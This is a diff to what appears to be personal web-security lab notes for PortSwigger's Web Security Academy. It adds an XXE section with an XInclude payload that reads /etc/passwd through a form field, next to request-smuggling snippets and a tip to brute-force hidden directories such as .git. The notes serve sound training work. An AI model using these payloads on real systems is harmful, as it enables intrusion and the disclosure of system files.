@@ -25,6 +25,8 @@
   * [Response Queue Poisoning via H2.TE Request Smuggling](#response-queue-poisoning-via-h2te-request-smuggling)
   * [Request Smuggling via CRLF Injection](#request-smuggling-via-crlf-injection)
   * [Request Splitting via CRLF Injection](#request-splitting-via-crlf-injection)
+* [XML External Entity XXE Injection Section](#xml-external-entity-xxe-injection-section)
+  * [xinclude](#xinclude-attack-xxe)
 * [Information disclosure Section](#information-disclosure-section)
 * [Web Cache Poisoning Section](#web-cache-poisoning-cache)
   * [Web Cache Poisoning With an Unkeyed Cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
@@ -307,6 +309,12 @@ Host: 0aab009204d51605c0a31134007c0017.web-security-academy.net\r\n
 GET /admin HTTP/1.1
 ```
 
+## XML external entity (XXE) injection Section
+
+### xIncLUde attack xxe
+```xml
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
 
 ## Information disclosure Section
 Always go for directory brute force and for .files(hidden files) e.g. <b>.git</b>
